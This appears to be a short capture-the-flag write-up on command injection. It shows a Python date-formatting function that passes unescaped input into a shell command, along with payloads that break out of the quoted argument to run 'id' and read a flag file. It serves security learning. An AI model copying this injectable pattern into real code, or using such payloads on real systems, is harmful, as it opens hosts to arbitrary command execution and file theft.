- __Vulnerability__: Command Injection 
- __Goal__: Injecting the date parameter triggers system command execution.

## Local testing the program

```python
import subprocess, os

def format_date(timestr):
    try:
        formatCMD = f'date -d "{timestr}" +"%h %d %Y %H %M"'
        formatDate = subprocess.getoutput(formatCMD)
    except:
        formatDate = 'Jan 01 1970 00 00'
    print(formatDate)

format_date("&&id")
format_date("10 oct 2010 10:10 am\";id && date 10 oct 2010 10:10 am\"")
```

#### Valid payloads

```sh
"10 oct 2010 10:10 am\";id && date 10 oct 2010 10:10 am\""
```

```sh
"10 oct 2010 10:10 am\";cat ../flag.txt && date 10 oct 2010 10:10 am\""
```

